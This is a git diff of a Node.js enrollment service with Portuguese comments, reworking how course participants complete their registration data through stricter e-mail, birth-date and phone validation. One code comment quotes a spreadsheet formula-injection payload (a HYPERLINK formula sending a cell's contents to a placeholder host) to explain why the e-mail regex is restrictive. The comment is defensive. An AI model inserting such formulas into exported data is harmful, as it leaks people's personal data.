@@ -156,26 +156,78 @@ async function cancelarInscricao({ cursistaId, courseId, req }) {
 }
 
 /**
- * Atualizacao dos dados pelo proprio cursista.
- * So contato: nome, CPF, matricula e lotacao vem da base oficial e alimentam o
- * certificado, entao nao podem ser alterados por aqui.
+ * Campos que o cursista precisa preencher para o cadastro ser considerado
+ * completo. A base oficial nao traz nenhum deles (data de nascimento vem vazia
+ * em 100% dos registros e telefone nem existe na planilha), entao e o cursista
+ * quem fornece.
+ *
+ * Genero fica de fora de proposito: e dado sensivel na LGPD (art. 5, II) e
+ * exigir a declaracao pediria finalidade especifica. Continua opcional.
  */
-async function atualizarMeusDados({ cursistaId, email, phone, req }) {
-  // Regex restritiva de proposito: a permissiva (`[^\s@]+@[^\s@]+\.[^\s@]+`) aceita
-  // coisas como `=hyperlink("http://x/?a=@"&a2,"c.li")`, que viram formula quando a
-  // planilha exportada e aberta. Aqui so passam os caracteres que de fato existem
-  // num endereco de e-mail.
-  const emailLimpo = String(email || '').trim().toLowerCase()
-  if (emailLimpo && (emailLimpo.length > 150 || !/^[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$/.test(emailLimpo))) {
-    throw erro(400, 'Informe um e-mail valido.')
-  }
+const CAMPOS_OBRIGATORIOS = ['birthDate', 'phone', 'email']
 
-  const telefoneLimpo = String(phone || '').replace(/\D/g, '')
-  if (telefoneLimpo && (telefoneLimpo.length < 10 || telefoneLimpo.length > 11)) {
+const RE_EMAIL = /^[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$/
+
+// Regex restritiva de proposito: a permissiva (`[^\s@]+@[^\s@]+\.[^\s@]+`) aceita
+// coisas como `=hyperlink("http://x/?a=@"&a2,"c.li")`, que viram formula quando a
+// planilha exportada e aberta no Excel.
+function validarEmail(valor, rotulo) {
+  const limpo = String(valor || '').trim().toLowerCase()
+  if (!limpo) return null
+  if (limpo.length > 150 || !RE_EMAIL.test(limpo)) {
+    throw erro(400, `Informe um ${rotulo} valido.`)
+  }
+  return limpo
+}
+
+function validarDataNascimento(valor) {
+  const texto = String(valor || '').trim()
+  if (!texto) return null
+  if (!/^\d{4}-\d{2}-\d{2}$/.test(texto)) throw erro(400, 'Informe a data de nascimento.')
+
+  const data = new Date(`${texto}T00:00:00Z`)
+  if (Number.isNaN(data.getTime())) throw erro(400, 'Data de nascimento invalida.')
+
+  const anos = (Date.now() - data.getTime()) / (365.25 * 24 * 3600 * 1000)
+  if (anos < 16 || anos > 100) throw erro(400, 'Data de nascimento fora do intervalo esperado.')
+  return texto
+}
+
+/**
+ * Atualiza os dados que o proprio cursista fornece e marca o cadastro como
+ * confirmado quando tudo o que e obrigatorio esta preenchido.
+ *
+ * Nome, CPF, funcao e vinculos vem da base oficial e alimentam o certificado --
+ * correcao neles passa pela coordenacao, nao por esta tela.
+ */
+async function atualizarMeuCadastro({ cursistaId, dados, req }) {
+  const emailInstitucional = validarEmail(dados?.emailInstitucional, 'e-mail institucional')
+  const emailPessoal = validarEmail(dados?.emailPessoal, 'e-mail pessoal')
+  const birthDate = validarDataNascimento(dados?.birthDate)
+
+  const phone = String(dados?.phone || '').replace(/\D/g, '')
+  if (phone && (phone.length < 10 || phone.length > 11)) {
     throw erro(400, 'Informe um telefone com DDD.')
   }
 
-  await repo.updateContact(cursistaId, { email: emailLimpo, phone: telefoneLimpo })
+  const genero = String(dados?.genero || '').trim().slice(0, 40) || null
+
+  const faltando = []
+  if (!birthDate) faltando.push('data de nascimento')
+  if (!phone) faltando.push('telefone')
+  if (!emailInstitucional && !emailPessoal) faltando.push('ao menos um e-mail')
+  if (faltando.length > 0) {
+    throw erro(400, `Para concluir o cadastro, informe: ${faltando.join(', ')}.`)
+  }
+
+  await repo.atualizarCadastro(cursistaId, {
+    birthDate,
+    emailInstitucional,
+    emailPessoal,
+    phone,
+    genero,
+  })
+
   await registrar({
     actorType: 'cursista',
     actorId: cursistaId,
@@ -183,7 +235,7 @@ async function atualizarMeusDados({ cursistaId, email, phone, req }) {
     cursistaId,
     req,
     // Registra QUAIS campos mudaram, nunca os valores (sao dado pessoal).
-    details: { campos: ['email', 'telefone'] },
+    details: { campos: ['nascimento', 'contato', 'genero'], confirmado: true },
   })
 
   return repo.findById(cursistaId, { fullCpf: true })
@@ -191,9 +243,10 @@ async function atualizarMeusDados({ cursistaId, email, phone, req }) {
 
 module.exports = {
   EDICAO_ATUAL,
+  CAMPOS_OBRIGATORIOS,
   listarCursosAbertos,
   listarMinhasInscricoes,
   inscrever,
   cancelarInscricao,
-  atualizarMeusDados,
+  atualizarMeuCadastro,
 }
